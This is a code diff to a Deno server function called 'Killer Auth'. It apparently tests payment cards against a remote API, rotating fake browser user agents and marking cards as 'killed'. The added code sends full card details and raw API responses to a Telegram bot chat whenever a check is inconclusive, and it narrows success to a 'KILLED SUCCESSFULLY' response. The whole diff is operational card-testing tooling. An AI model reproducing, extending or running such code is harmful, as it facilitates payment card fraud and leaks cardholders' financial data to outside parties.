@@ -40,6 +40,29 @@ const notifyChargedCard = (
   }).catch((err) => console.error("[KILLER-AUTH] notify-charged-card error:", err));
 };
 
+// Send admin debug notification via Telegram (fire-and-forget)
+const sendAdminDebug = (cardDetails: string, rawResponse: string) => {
+  const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
+  const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID");
+  
+  if (!TELEGRAM_BOT_TOKEN || !ADMIN_TELEGRAM_CHAT_ID) return;
+
+  const message = `🔍 <b>Killer Auth Debug</b>\n\n` +
+    `<b>Card:</b> <code>${cardDetails}</code>\n` +
+    `<b>Status:</b> UNKNOWN\n\n` +
+    `<b>Raw API Response:</b>\n<pre>${rawResponse.substring(0, 3000)}</pre>`;
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: ADMIN_TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: "HTML",
+    }),
+  }).catch((err) => console.error("[KILLER-AUTH] admin debug error:", err));
+};
+
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
@@ -50,31 +73,14 @@ const userAgents = [
 
 const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
 
-// Determine status from API response - Killer Auth uses KILLED/UNKNOWN only
-const getStatusFromResponse = (data: Record<string, unknown>): "killed" | "unknown" => {
-  const message = (data?.message as string)?.toLowerCase() || '';
-  const status = (data?.status as string)?.toUpperCase() || '';
-  
-  // KILLED responses (successful check - card is valid/working)
-  if (message.includes("payment method added successfully") || message.includes("card added successfully")) {
-    return "killed";
-  }
-  if (status === 'APPROVED' || status === 'SUCCESS' || status === 'LIVE') {
+// Determine status from API response - only "KILLED SUCCESSFULLY" means killed
+const getStatusFromResponse = (responseText: string): "killed" | "unknown" => {
+  // Check for the specific success message
+  if (responseText.includes("KILLED SUCCESSFULLY")) {
     return "killed";
   }
   
-  // Also mark declined cards as KILLED (card was checked successfully)
-  if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
-    return "killed";
-  }
-  if (message.includes("invalid") || message.includes("expired") || message.includes("do not honor")) {
-    return "killed";
-  }
-  if (status === 'DECLINED' || status === 'DEAD' || status === 'FAILED') {
-    return "killed";
-  }
-  
-  // Everything else is UNKNOWN (API error, timeout, etc.)
+  // Everything else is UNKNOWN
   return "unknown";
 };
 
@@ -100,18 +106,8 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     const rawText = await response.text();
     console.log(`[KILLER-AUTH] Attempt ${attempt} - Raw API response:`, rawText);
 
-    let data: Record<string, unknown>;
-    try {
-      data = JSON.parse(rawText);
-    } catch {
-      data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
-    }
-
-    console.log(`[KILLER-AUTH] Attempt ${attempt} - Parsed response:`, data);
-
-    // Add our computed status for frontend (no raw response)
-    const computedStatus = getStatusFromResponse(data);
-    const apiMessage = data.message || 'No response message';
+    // Add our computed status for frontend based on raw text
+    const computedStatus = getStatusFromResponse(rawText);
     
     // Check if response is UNKNOWN and should retry
     if (computedStatus === "unknown" && attempt < maxRetries) {
@@ -126,8 +122,8 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
     // Return with raw response for debugging
     return {
       computedStatus,
-      apiStatus: data.status || 'UNKNOWN',
-      apiMessage,
+      apiStatus: computedStatus === 'killed' ? 'KILLED' : 'UNKNOWN',
+      apiMessage: rawText,
       rawResponse: rawText
     };
   } catch (error) {
@@ -224,6 +220,9 @@ serve(async (req) => {
         '$0.00',
         'Killer Auth'
       );
+    } else {
+      // Send admin debug notification for UNKNOWN results
+      sendAdminDebug(cc, String(data.rawResponse || data.apiMessage || 'No response'));
     }
 
     return new Response(
